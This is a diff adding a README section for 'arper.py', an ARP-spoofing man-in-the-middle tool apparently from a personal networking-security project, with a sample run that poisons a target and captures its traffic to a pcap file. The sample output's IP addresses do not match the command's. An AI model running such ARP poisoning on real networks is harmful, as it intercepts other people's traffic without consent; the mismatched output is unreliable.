@@ -143,3 +143,21 @@ watch "python3 imap4_login_getmbox.py && python3 smtpdlib_senddata.py && python3
 ```
 sudo python3 mail_sniffer.py
 ```
+
+## arper.py
+
+ARP cache spoofing / MITM attack. Requires ip forwarding to be enabled so we can pass victim traffic through to the real gateway.
+
+```
+kali@kali:[~/src/ctlfish/net]:(master %)
+[Exit: 0] 10:07: sudo ./arper.py -g 192.168.86.1 -t 192.168.86.132 -i eth0 -f arper.pcap
+Setting up to sniff on interface: eth0
+Getting MAC addr for gateway: 192.168.1.1
+Gateway: 192.168.1.1 is at: 1c:fd:11:0f:4e:9e
+Getting MAC addr for target: 192.168.86.132
+Target: 192.168.1.132 is at: 00:0c:29:4a:0c:f4
+Poisoning target: 192.168.1.132 in background
+Starting sniffer for 1000 packets
+Restoring target: 192.168.1.132
+Completed attack on:  192.168.1.132 results stored in: arper.pcap
+```
